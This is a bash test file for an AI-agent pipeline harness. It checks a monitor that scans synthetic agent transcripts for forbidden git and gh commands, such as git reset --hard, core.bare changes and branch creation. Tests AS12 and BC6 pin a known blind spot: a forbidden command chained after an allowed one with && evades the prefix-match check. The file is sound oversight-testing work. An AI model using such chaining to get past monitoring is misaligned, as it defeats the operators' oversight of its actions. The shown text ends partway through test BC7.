# "Cannot index array with string"; the `2>/dev/null || true` swallows the
# error stream, the per-stage read returns empty, and the resolver falls
# through to the global lookup (then to the built-in default). This is a
# different code path from QA5 (parent-key TYPE confusion vs. value-shape
# malformed) but it lands at the same observable: built-in default wins,
# no operator-visible warning.
#
# Pin the graceful-fallthrough so a future "tighten jq's type guard"
# refactor either preserves silent fallthrough (test stays green) or
# adds an explicit reject + log (test breaks, prompting a doc update).
TARGET_REPO_ARR="$_TEST_STUB_DIR/target-arrshape"
mkdir -p "$TARGET_REPO_ARR/.pipeline-config/schemas"
jq -n '{
  project: { slug: "arr-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: ["brainstorming", 60] }
}' > "$TARGET_REPO_ARR/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_ARR/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_ARR="$_TEST_STUB_DIR/dryrun-arrshape.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_ARR" "arr-slug" brainstorming "$DRYRUN_OUT_ARR"
# No global override either, so built-in default 60-min (3600s) must win.
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_ARR"; then
  pass_at "ENG-65 QA7 (adversarial): dispatch_timeout_minutes_per_stage as array (parent-key type confusion) → jq error swallowed → built-in default 3600s wins"
else
  fail_at "ENG-65 QA7: array-shaped parent key did not fall through cleanly" \
    "log: $(cat "$DRYRUN_OUT_ARR")"
fi

# QA8 — JSON-string-of-digits per-stage value (`"45"`). The plan and
# CLAUDE.md say "Values must be integers (e.g. 60, not '60m' or '1h')",
# but jq -r unquotes string values, so a JSON string `"45"` emerges from
# the jq pipe as the bareword `45`, passes the `^[0-9]+$` regex, and is
# silently honored as a 45-minute override. This is contrary to the
# "integers-only" doc claim — a documentation drift that the operator
# might exploit unintentionally (eg. copy-pasting from a YAML→JSON
# converter that wraps numerics).
#
# Pin the *actual* behavior. Future strict-type refactor either:
#   (a) tightens the jq filter to reject non-numeric JSON values
#       (test breaks → prompts a doc-update PR), or
#   (b) updates CLAUDE.md to document numeric-strings-OK as supported
#       (test stays green, doc gets a one-liner).
TARGET_REPO_STR="$_TEST_STUB_DIR/target-strdigit"
mkdir -p "$TARGET_REPO_STR/.pipeline-config/schemas"
jq -n '{
  project: { slug: "str-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: "45" } }
}' > "$TARGET_REPO_STR/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_STR/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_STR="$_TEST_STUB_DIR/dryrun-strdigit.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_STR" "str-slug" brainstorming "$DRYRUN_OUT_STR"
# Assert override applied: 45 min = 2700s. (Built-in 3600s would mean the
# string was rejected; the test then has to flip to a strict-rejection
# expectation, which is the intentional break-on-tighten signal.)
if grep -qE 'gtimeout.*\b2700\b' "$DRYRUN_OUT_STR"; then
  pass_at "ENG-65 QA8 (adversarial): JSON string-of-digits '45' silently accepted (jq -r strips quotes, regex passes) → 2700s applied. Pins doc/code drift; tighten the filter or update CLAUDE.md."
else
  fail_at "ENG-65 QA8: numeric-string per-stage override behavior changed (expected 2700s)" \
    "log: $(cat "$DRYRUN_OUT_STR")"
fi

# ─── Group 7: assert_no_tool_invocation fixtures (ENG-43, AS1-AS6) ────
# AS1-AS6 deliver the issue's fixtures E-J (renamed per brainstorm
# D-009 to avoid colliding with existing fixtures A-K above). Each
# fixture writes (or does not write) an NDJSON file under
# $_TEST_STUB_DIR/, calls assert_no_tool_invocation directly, and
# asserts the (rc, stdout) tuple. No claude invocation, no real renderer.
printf '\n--- assert_no_tool_invocation fixtures (AS1-AS6, ENG-43; issue fixtures E-J) ---\n'

if ! declare -f assert_no_tool_invocation >/dev/null 2>&1; then
  fail_at "precondition: assert_no_tool_invocation defined in dispatch.sh" \
          "function not found after sourcing — Task 1 implementation missing"
  printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
  exit 1
fi

# AS1 — issue fixture E: tool_use invoking gh pr create matches
TX_AS1="$_TEST_STUB_DIR/tx-as1.ndjson"
cat > "$TX_AS1" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as1","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title foo --body bar"}}]}}
NDJSON
out_as1="$(assert_no_tool_invocation "$TX_AS1" "gh pr create")" && rc_as1=0 || rc_as1=$?
if [[ "$rc_as1" == "1" && "$out_as1" == "gh pr create --title foo --body bar" ]]; then
  pass_at "AS1: tool_use match returns 1 + matched command on stdout"
else
  fail_at "AS1" "rc=$rc_as1 out=$out_as1"
fi

# AS2 — issue fixture F: only allowed tools (git, gh pr list, Read, Edit); rc=0
TX_AS2="$_TEST_STUB_DIR/tx-as2.ndjson"
cat > "$TX_AS2" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as2","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git log --oneline -5"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr list --state open"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"path":"README.md"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"x"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{}}]}}
NDJSON
out_as2="$(assert_no_tool_invocation "$TX_AS2" "gh pr create")" && rc_as2=0 || rc_as2=$?
if [[ "$rc_as2" == "0" && -z "$out_as2" ]]; then
  pass_at "AS2: only allowed tools (git/gh pr list/Read/Edit/empty) → rc=0, empty stdout"
else
  fail_at "AS2" "rc=$rc_as2 out=$out_as2"
fi

# AS3 — issue fixture G: text block with literal `gh pr create` prose ignored
TX_AS3="$_TEST_STUB_DIR/tx-as3.ndjson"
cat > "$TX_AS3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as3","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"I considered gh pr create but used git instead."}]}}
NDJSON
out_as3="$(assert_no_tool_invocation "$TX_AS3" "gh pr create")" && rc_as3=0 || rc_as3=$?
if [[ "$rc_as3" == "0" && -z "$out_as3" ]]; then
  pass_at "AS3: text block prose with literal pattern → rc=0 (text blocks ignored)"
else
  fail_at "AS3" "rc=$rc_as3 out=$out_as3"
fi

# AS4 — issue fixture H: JSON-escaped quoted "gh pr create" inside text block ignored
TX_AS4="$_TEST_STUB_DIR/tx-as4.ndjson"
cat > "$TX_AS4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as4","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"The doc says \"gh pr create\" is forbidden here."}]}}
NDJSON
out_as4="$(assert_no_tool_invocation "$TX_AS4" "gh pr create")" && rc_as4=0 || rc_as4=$?
if [[ "$rc_as4" == "0" && -z "$out_as4" ]]; then
  pass_at "AS4: JSON-escaped quoted pattern in text block → rc=0 (text blocks ignored)"
else
  fail_at "AS4" "rc=$rc_as4 out=$out_as4"
fi

# AS5 — issue fixture I: malformed JSON line skipped via fromjson?, subsequent match returned
TX_AS5="$_TEST_STUB_DIR/tx-as5.ndjson"
cat > "$TX_AS5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as5","model":"claude-opus-4-7"}
{not json{
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --draft"}}]}}
NDJSON
out_as5="$(assert_no_tool_invocation "$TX_AS5" "gh pr create")" && rc_as5=0 || rc_as5=$?
if [[ "$rc_as5" == "1" && "$out_as5" == "gh pr create --draft" ]]; then
  pass_at "AS5: malformed line skipped via fromjson?; subsequent match returns 1"
else
  fail_at "AS5" "rc=$rc_as5 out=$out_as5"
fi

# AS6 — issue fixture J: missing transcript file → rc=0 (soft-fail per D-005)
TX_AS6="$_TEST_STUB_DIR/tx-as6-missing-do-not-create.ndjson"
rm -f "$TX_AS6"
out_as6="$(assert_no_tool_invocation "$TX_AS6" "gh pr create")" && rc_as6=0 || rc_as6=$?
if [[ "$rc_as6" == "0" && -z "$out_as6" ]]; then
  pass_at "AS6: missing transcript → rc=0 (soft-fail)"
else
  fail_at "AS6" "rc=$rc_as6 out=$out_as6"
fi

# ─── ENG-71: build-stage forbidden patterns (AS7-AS12) ────────────────
# Pin the four worktree-HEAD-mutating verbs (`git checkout`, `git switch`,
# `git pull`, `git reset`) at the helper level. These mirror AS1's shape:
# tool_use with .input.command starting with the pattern → rc=1, matched
# command on stdout. AS11 covers passthrough (only allowed git verbs);
# AS12 confirms the helper is stage-agnostic (the gate lives in
# _render_and_capture_stream, exercised at the renderer level by AT7).
printf '\n--- ENG-71: build-stage forbidden patterns (AS7-AS12) ---\n'

# AS7 — git checkout standalone
TX_AS7="$_TEST_STUB_DIR/tx-as7.ndjson"
cat > "$TX_AS7" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}}]}}
NDJSON
out_as7="$(assert_no_tool_invocation "$TX_AS7" "git checkout")" && rc_as7=0 || rc_as7=$?
if [[ "$rc_as7" == "1" && "$out_as7" == "git checkout main" ]]; then
  pass_at "AS7: git checkout standalone → rc=1, matched command on stdout"
else
  fail_at "AS7" "rc=$rc_as7 out=$out_as7"
fi

# AS8 — git switch standalone
TX_AS8="$_TEST_STUB_DIR/tx-as8.ndjson"
cat > "$TX_AS8" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch main"}}]}}
NDJSON
out_as8="$(assert_no_tool_invocation "$TX_AS8" "git switch")" && rc_as8=0 || rc_as8=$?
if [[ "$rc_as8" == "1" && "$out_as8" == "git switch main" ]]; then
  pass_at "AS8: git switch standalone → rc=1, matched command on stdout"
else
  fail_at "AS8" "rc=$rc_as8 out=$out_as8"
fi

# AS9 — git pull standalone
TX_AS9="$_TEST_STUB_DIR/tx-as9.ndjson"
cat > "$TX_AS9" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as9","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git pull --ff-only origin main"}}]}}
NDJSON
out_as9="$(assert_no_tool_invocation "$TX_AS9" "git pull")" && rc_as9=0 || rc_as9=$?
if [[ "$rc_as9" == "1" && "$out_as9" == "git pull --ff-only origin main" ]]; then
  pass_at "AS9: git pull standalone → rc=1, matched command on stdout"
else
  fail_at "AS9" "rc=$rc_as9 out=$out_as9"
fi

# AS10 — git reset standalone
TX_AS10="$_TEST_STUB_DIR/tx-as10.ndjson"
cat > "$TX_AS10" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as10","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git reset --hard origin/main"}}]}}
NDJSON
out_as10="$(assert_no_tool_invocation "$TX_AS10" "git reset")" && rc_as10=0 || rc_as10=$?
if [[ "$rc_as10" == "1" && "$out_as10" == "git reset --hard origin/main" ]]; then
  pass_at "AS10: git reset standalone → rc=1, matched command on stdout"
else
  fail_at "AS10" "rc=$rc_as10 out=$out_as10"
fi

# AS11 — passthrough: only allowed verbs present → rc=0 for each forbidden pattern
TX_AS11="$_TEST_STUB_DIR/tx-as11.ndjson"
cat > "$TX_AS11" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as11","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git fetch origin main"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git clone --quiet --branch foo /src /dst"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git rebase --quiet origin/main"}}]}}
NDJSON
as11_failures=0
for _pat in 'git checkout' 'git switch' 'git pull' 'git reset'; do
  out_as11="$(assert_no_tool_invocation "$TX_AS11" "$_pat")" && rc_as11=0 || rc_as11=$?
  if [[ "$rc_as11" != "0" || -n "$out_as11" ]]; then
    as11_failures=$((as11_failures+1))
    fail_at "AS11 ($_pat passthrough)" "rc=$rc_as11 out=$out_as11"
  fi
done
if [[ "$as11_failures" == "0" ]]; then
  pass_at "AS11: passthrough — only allowed git verbs (fetch/clone/rebase) → rc=0 for all four forbidden patterns"
fi

# AS12 — chained-command bypass (documents D-002's startswith blind spot
# that justifies D-003 in run-stage.sh, ENG-71 brainstorm §7 / O-4).
# Pre-iter-6 this slot tested "helper is stage-agnostic" via a non-matching
# transcript — but the helper has no stage parameter, so the assertion was
# tautological (review iter-2 m4). Repurposed: a chained command that
# starts with the allowed `git fetch` prefix but contains the forbidden
# `git checkout` after `&&`. assert_no_tool_invocation prefix-matches via
# jq's `startswith`, so the chained command does NOT match the
# `git checkout` pattern. Pinning this behavior is what proves the D-003
# state-of-the-world catch-net is not redundant.
TX_AS12="$_TEST_STUB_DIR/tx-as12.ndjson"
cat > "$TX_AS12" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"as12","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git fetch origin main && git checkout main"}}]}}
NDJSON
out_as12="$(assert_no_tool_invocation "$TX_AS12" "git checkout")" && rc_as12=0 || rc_as12=$?
if [[ "$rc_as12" == "0" && -z "$out_as12" ]]; then
  pass_at "AS12: chained-command bypass — \`git fetch && git checkout\` does NOT match \`git checkout\` (startswith blind spot; D-003 is the catch-net for this surface)"
else
  fail_at "AS12 chained-command bypass" "rc=$rc_as12 out=$out_as12 (expected rc=0 because the chained command starts with 'git fetch', not 'git checkout')"
fi

# ─── Group 7 cont'd: core.bare transcript-pattern fixtures (ENG-68, CB1-CB8) ───
# Pin the five forbidden core.bare-touching git command shapes that
# _render_and_capture_stream's Task-5 loop scans for. Each fixture writes a
# self-contained NDJSON transcript, calls assert_no_tool_invocation directly
# with one of the five harness patterns, and asserts (rc=1, stdout=<full
# command>). The sixth fixture (CB6) covers the multi-tool_use ordering case
# — match in second position, helper still finds it via head -1.
printf '\n--- assert_no_tool_invocation fixtures (CB1-CB8, ENG-68 core.bare patterns + renderer integration) ---\n'

# CB1 — `git config core.bare true` matches "git config core.bare"
TX_CB1="$_TEST_STUB_DIR/tx-cb1.ndjson"
cat > "$TX_CB1" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb1","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
NDJSON
out_cb1="$(assert_no_tool_invocation "$TX_CB1" "git config core.bare")" && rc_cb1=0 || rc_cb1=$?
if [[ "$rc_cb1" == "1" && "$out_cb1" == "git config core.bare true" ]]; then
  pass_at "CB1: 'git config core.bare true' matches 'git config core.bare' pattern"
else
  fail_at "CB1" "rc=$rc_cb1 out=$out_cb1"
fi

# CB2 — `git init --bare` matches "git init --bare"
TX_CB2="$_TEST_STUB_DIR/tx-cb2.ndjson"
cat > "$TX_CB2" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb2","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git init --bare /tmp/x"}}]}}
NDJSON
out_cb2="$(assert_no_tool_invocation "$TX_CB2" "git init --bare")" && rc_cb2=0 || rc_cb2=$?
if [[ "$rc_cb2" == "1" && "$out_cb2" == "git init --bare /tmp/x" ]]; then
  pass_at "CB2: 'git init --bare /tmp/x' matches 'git init --bare' pattern"
else
  fail_at "CB2" "rc=$rc_cb2 out=$out_cb2"
fi

# CB3 — `git --bare config core.bare true` matches "git --bare"
TX_CB3="$_TEST_STUB_DIR/tx-cb3.ndjson"
cat > "$TX_CB3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb3","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git --bare config core.bare true"}}]}}
NDJSON
out_cb3="$(assert_no_tool_invocation "$TX_CB3" "git --bare")" && rc_cb3=0 || rc_cb3=$?
if [[ "$rc_cb3" == "1" && "$out_cb3" == "git --bare config core.bare true" ]]; then
  pass_at "CB3: 'git --bare ...' matches 'git --bare' top-level option pattern"
else
  fail_at "CB3" "rc=$rc_cb3 out=$out_cb3"
fi

# CB4 — `git config --add core.bare true` matches "git config --add core.bare"
TX_CB4="$_TEST_STUB_DIR/tx-cb4.ndjson"
cat > "$TX_CB4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb4","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config --add core.bare true"}}]}}
NDJSON
out_cb4="$(assert_no_tool_invocation "$TX_CB4" "git config --add core.bare")" && rc_cb4=0 || rc_cb4=$?
if [[ "$rc_cb4" == "1" && "$out_cb4" == "git config --add core.bare true" ]]; then
  pass_at "CB4: 'git config --add core.bare ...' matches multi-value-add pattern"
else
  fail_at "CB4" "rc=$rc_cb4 out=$out_cb4"
fi

# CB5 — `git -c core.bare=true config foo bar` matches "git -c core.bare="
TX_CB5="$_TEST_STUB_DIR/tx-cb5.ndjson"
cat > "$TX_CB5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb5","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git -c core.bare=true config foo bar"}}]}}
NDJSON
out_cb5="$(assert_no_tool_invocation "$TX_CB5" "git -c core.bare=")" && rc_cb5=0 || rc_cb5=$?
if [[ "$rc_cb5" == "1" && "$out_cb5" == "git -c core.bare=true config foo bar" ]]; then
  pass_at "CB5: 'git -c core.bare=...' matches per-invocation override pattern"
else
  fail_at "CB5" "rc=$rc_cb5 out=$out_cb5"
fi

# CB6 — multi-tool_use transcript with the matching pattern as the SECOND
# tool_use block; helper's head -1 returns the first MATCHING command.
TX_CB6="$_TEST_STUB_DIR/tx-cb6.ndjson"
cat > "$TX_CB6" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb6","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status --porcelain"}},{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
NDJSON
out_cb6="$(assert_no_tool_invocation "$TX_CB6" "git config core.bare")" && rc_cb6=0 || rc_cb6=$?
if [[ "$rc_cb6" == "1" && "$out_cb6" == "git config core.bare true" ]]; then
  pass_at "CB6: assertion finds matching tool_use even when preceded by non-matching ones"
else
  fail_at "CB6" "rc=$rc_cb6 out=$out_cb6"
fi

# CB7 — _render_and_capture_stream end-to-end (addresses review iteration 2
# major-b: "rc=13 routing untested"). CB1-CB6 cover assert_no_tool_invocation
# directly. None exercise the renderer wrapper that, on a transcript matching
# one of the five core.bare patterns, writes the sidecar at
# $ISSUE_DIR/.transcript-violation-<stage> and returns 13 — the contract
# bin/run-stage.sh::main's rc==13 branch reads. This pins the dispatch-side
# wiring of D-003 end-to-end, mirroring AT1's role for D-002 (gh pr create →
# rc=22).
USAGE_CB7="$ISSUE_DIR/usage-implementing-CB7.json"
RAW_CB7="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_CB7="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_CB7" "$RAW_CB7" "$VIOLATION_CB7"

cb7_rc=0
RENDER_OUT_CB7="$(
  _render_and_capture_stream "$USAGE_CB7" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"cb7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || cb7_rc=$?

if [[ "$cb7_rc" == "13" ]] \
   && [[ -f "$VIOLATION_CB7" ]] \
   && [[ "$(cat "$VIOLATION_CB7")" == "git config core.bare true" ]] \
   && grep -q '\[assert\] stage=implementing transcript invoked forbidden git form: git config core.bare true' <<<"$RENDER_OUT_CB7"; then
  pass_at "CB7 (renderer integration): core.bare in transcript → rc=13, sidecar written, log line emitted"
else
  fail_at "CB7 renderer integration" "rc=$cb7_rc viol_exists=$([[ -f $VIOLATION_CB7 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_CB7" 2>/dev/null) out=$RENDER_OUT_CB7"
fi
rm -f "$VIOLATION_CB7"

# CB8 — pre-clean idempotency on stale sidecar from a prior run. The renderer's
# rm -f "$violation_file" at function entry covers BOTH the existing rc=22
# branch AND the new rc=13 branch (single sidecar path per stage; ENG-43 D-008).
# A stale .transcript-violation-implementing from a prior dispatch must not
# leak into a clean current dispatch and falsely halt run-stage.sh's rc-branch
# reader.
USAGE_CB8="$ISSUE_DIR/usage-implementing-CB8.json"
VIOLATION_CB8="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_CB8" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
printf 'stale\n' > "$VIOLATION_CB8"
cb8_rc=0
_render_and_capture_stream "$USAGE_CB8" "$ISSUE_DIR" "implementing" >/dev/null 2>&1 <<'NDJSON' || cb8_rc=$?
{"type":"system","subtype":"init","session_id":"cb8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"clean dispatch — no forbidden tool"}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$cb8_rc" == "0" ]] && [[ ! -f "$VIOLATION_CB8" ]]; then
  pass_at "CB8 (sidecar pre-clean): clean dispatch removes stale sidecar from prior run"
else
  fail_at "CB8 sidecar pre-clean" "rc=$cb8_rc viol_after=$([[ -f $VIOLATION_CB8 ]] && echo present || echo absent)"
fi
rm -f "$VIOLATION_CB8"

# ─── Group 7 cont'd: branch-creation transcript-pattern fixtures (ENG-66, BC1-BC8) ───
# AGENT_PROMPTS.md §3 rule 2 lists exactly four banned branch-creation
# forms. _render_and_capture_stream's ENG-66 cross-stage loop scans for
# these four prefixes on every dispatched stage (no stage gate; mirrors
# the ENG-68 cross-stage core.bare block). BC1-BC4 pin each of the four
# positives; BC5 pins the canonical-checkout negative; BC6 pins the
# inherited startswith blind spot on chained commands (mirror of AS12);
# BC7 pins renderer integration end-to-end on stage=implementing
# (mirror of CB7); BC8 pins cross-stage gating by firing on stage=qa.
printf '\n--- assert_no_tool_invocation fixtures (BC1-BC8, ENG-66 branch-creation patterns + renderer integration + cross-stage gating) ---\n'

# BC1 — `git checkout -b feature/eng-99-foo` matches "git checkout -b"
TX_BC1="$_TEST_STUB_DIR/tx-bc1.ndjson"
cat > "$TX_BC1" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc1","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -b feature/eng-99-foo"}}]}}
NDJSON
out_bc1="$(assert_no_tool_invocation "$TX_BC1" "git checkout -b")" && rc_bc1=0 || rc_bc1=$?
if [[ "$rc_bc1" == "1" && "$out_bc1" == "git checkout -b feature/eng-99-foo" ]]; then
  pass_at "BC1: 'git checkout -b feature/eng-99-foo' matches 'git checkout -b' pattern"
else
  fail_at "BC1" "rc=$rc_bc1 out=$out_bc1"
fi

# BC2 — `git checkout -B feature/eng-99-foo` matches "git checkout -B" (issue AC3)
TX_BC2="$_TEST_STUB_DIR/tx-bc2.ndjson"
cat > "$TX_BC2" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc2","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -B feature/eng-99-foo"}}]}}
NDJSON
out_bc2="$(assert_no_tool_invocation "$TX_BC2" "git checkout -B")" && rc_bc2=0 || rc_bc2=$?
if [[ "$rc_bc2" == "1" && "$out_bc2" == "git checkout -B feature/eng-99-foo" ]]; then
  pass_at "BC2: 'git checkout -B feature/eng-99-foo' matches 'git checkout -B' pattern (issue AC3)"
else
  fail_at "BC2" "rc=$rc_bc2 out=$out_bc2"
fi

# BC3 — `git branch -m feature-eng-99` matches "git branch -m"
TX_BC3="$_TEST_STUB_DIR/tx-bc3.ndjson"
cat > "$TX_BC3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc3","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git branch -m feature-eng-99"}}]}}
NDJSON
out_bc3="$(assert_no_tool_invocation "$TX_BC3" "git branch -m")" && rc_bc3=0 || rc_bc3=$?
if [[ "$rc_bc3" == "1" && "$out_bc3" == "git branch -m feature-eng-99" ]]; then
  pass_at "BC3: 'git branch -m feature-eng-99' matches 'git branch -m' pattern"
else
  fail_at "BC3" "rc=$rc_bc3 out=$out_bc3"
fi

# BC4 — `git switch -c feature/eng-99-foo` matches "git switch -c"
TX_BC4="$_TEST_STUB_DIR/tx-bc4.ndjson"
cat > "$TX_BC4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc4","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch -c feature/eng-99-foo"}}]}}
NDJSON
out_bc4="$(assert_no_tool_invocation "$TX_BC4" "git switch -c")" && rc_bc4=0 || rc_bc4=$?
if [[ "$rc_bc4" == "1" && "$out_bc4" == "git switch -c feature/eng-99-foo" ]]; then
  pass_at "BC4: 'git switch -c feature/eng-99-foo' matches 'git switch -c' pattern"
else
  fail_at "BC4" "rc=$rc_bc4 out=$out_bc4"
fi

# BC5 — passthrough: `git checkout {canonical-branch}` (no -b/-B) does NOT
# match any of the four forbidden patterns (issue AC4). Loop over each
# pattern; each must return rc=0 with empty stdout.
TX_BC5="$_TEST_STUB_DIR/tx-bc5.ndjson"
cat > "$TX_BC5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc5","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout feat/eng-66-add-transcript-based-runtime-defense"}}]}}
NDJSON
bc5_failures=0
for _pat in 'git checkout -b' 'git checkout -B' 'git branch -m' 'git switch -c'; do
  out_bc5="$(assert_no_tool_invocation "$TX_BC5" "$_pat")" && rc_bc5=0 || rc_bc5=$?
  if [[ "$rc_bc5" != "0" || -n "$out_bc5" ]]; then
    bc5_failures=$((bc5_failures+1))
    fail_at "BC5 ($_pat passthrough)" "rc=$rc_bc5 out=$out_bc5"
  fi
done
if [[ "$bc5_failures" == "0" ]]; then
  pass_at "BC5: 'git checkout feat/eng-66-...' (no -b/-B) does NOT match any of the four forbidden patterns (issue AC4)"
fi

# BC6 — chained-command bypass: `git status && git checkout -b feature/foo`
# starts with `git status`, not `git checkout -b`. Inherited startswith
# blind spot per brainstorm O-2; mirrors AS12 / CB6's startswith semantics.
# Documents the limitation so a future refactor doesn't accidentally fix
# it without an audit.
TX_BC6="$_TEST_STUB_DIR/tx-bc6.ndjson"
cat > "$TX_BC6" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc6","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status && git checkout -b feature/foo"}}]}}
NDJSON
out_bc6="$(assert_no_tool_invocation "$TX_BC6" "git checkout -b")" && rc_bc6=0 || rc_bc6=$?
if [[ "$rc_bc6" == "0" && -z "$out_bc6" ]]; then
  pass_at "BC6: chained-command bypass — 'git status && git checkout -b feature/foo' does NOT match (startswith blind spot; brainstorm O-2)"
else
  fail_at "BC6 chained-command bypass" "rc=$rc_bc6 out=$out_bc6 (expected rc=0; the chained command starts with 'git status', not 'git checkout -b')"
fi

# BC7 — _render_and_capture_stream end-to-end on stage="implementing"
# (mirror of CB7 for ENG-68). Pin the dispatch-side wiring of D-001/D-002
# end-to-end: gating absence (cross-stage), sidecar write at
# ${issue_dir}/.transcript-violation-implementing, log-line emission,
# rc=23.
USAGE_BC7="$ISSUE_DIR/usage-implementing-BC7.json"
RAW_BC7="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_BC7="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_BC7" "$RAW_BC7" "$VIOLATION_BC7"

bc7_rc=0
RENDER_OUT_BC7="$(
  _render_and_capture_stream "$USAGE_BC7" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -B feature/eng-66-foo"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc7_rc=$?

